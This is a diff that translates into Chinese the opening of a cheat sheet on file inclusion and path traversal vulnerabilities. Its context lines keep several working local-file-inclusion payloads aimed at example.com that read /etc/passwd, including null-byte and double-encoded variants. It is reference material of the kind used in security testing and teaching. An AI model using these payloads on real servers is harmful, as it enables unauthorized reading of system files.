@@ -1,16 +1,16 @@
 # 文件包含
 
-> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
+> 文件包含漏洞使攻击者可以包含文件，通常利用目标应用程序中实现的“动态文件包含”机制
 
-> The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
+> 路径遍历漏洞允许攻击者访问文件，通常利用目标应用程序中实现的“读取”机制
 
-## Summary
+## 概要
 
-* [Tools](#tools)
-* [Basic LFI](#basic-lfi)
-    * [Null byte](#null-byte)
-    * [Double encoding](#double-encoding)
-    * [UTF-8 encoding](#utf-8-encoding)
+* [工具](#工具)
+* [基础本地文件包含](#基础本地文件包含)
+    * [Null字节](#null-字节)
+    * [双重编码](#双重编码)
+    * [UTF-8 编码](#utf-8 编码)
     * [Path and dot truncation](#path-and-dot-truncation)
     * [Filter bypass tricks](#filter-bypass-tricks)
 * [Basic RFI](#basic-rfi)
@@ -44,7 +44,7 @@ In the following examples we include the `/etc/passwd` file, check the `Director
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
-### Null byte
+### Null 字节
 
 :warning: In versions of PHP below 5.3.4 we can terminate with null byte.
 
@@ -52,7 +52,7 @@ http://example.com/index.php?page=../../../etc/passwd
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
-### Double encoding
+### 双重编码
 
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
